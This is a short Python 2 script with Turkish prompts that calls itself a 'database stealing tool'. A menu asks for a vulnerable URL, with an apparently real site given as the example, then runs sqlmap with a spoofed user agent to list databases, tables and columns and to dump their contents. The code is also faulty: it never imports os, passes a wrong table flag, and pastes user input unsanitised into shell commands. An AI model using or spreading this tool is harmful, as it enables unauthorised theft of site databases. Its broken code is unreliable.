#!/usr/bin/env python
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Veri Tabanı calma")

print("""
Veri Tabanı calma aracına hosgeldiniz.

1) Sadece Acikli Linki Biliyorum
2) Acikli Linki, Veritabani Adini Biliyorum.
3) Acikli Linki, Veritabani Adini, Tablo Adini Biliyorum.
4) Acikli Linki, Veritabani Adini, Tablo Adini, Colon Adini Biliyorum.

örnek Acikli Link : http://www.suesupriano.com/article.php?id=25

""")

islemno = raw_input("Islem No Gİrin: ")
if(islemno=="1"):
    aciklilink = raw_input("Acikli Linki Girin: ")
    os.system("sqlmap -u " + aciklilink + " --dbs --random-agent")
elif(islemno=="2"):
    aciklilink = raw_input("Acikli Linki Girin: ")
    veritabani = raw_input("Veritabani Adini Girin: ")
    os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")
elif(islemno=="3"):
    aciklilink = raw_input("Acikli Linki Girin: ")
    veritabani = raw_input("Veritabani Adini Girin: ")
    tablo = raw_input("tablo Adini Girin: ")
    os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -t " + tablo + " --columns --random-agent")
elif(islemno=="4"):
    aciklilink = raw_input("Acikli Linki Girin: ")
    veritabani = raw_input("Veritabani Adini Girin: ")
    tablo = raw_input("tablo Adini Girin: ")
    colon = raw_input("sütun/colon Adini Girin: ")
    os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -t " + tablo + " -C " + colon + " --dump --random-agent")
else:
    print("hatali seçim yaptiniz...")



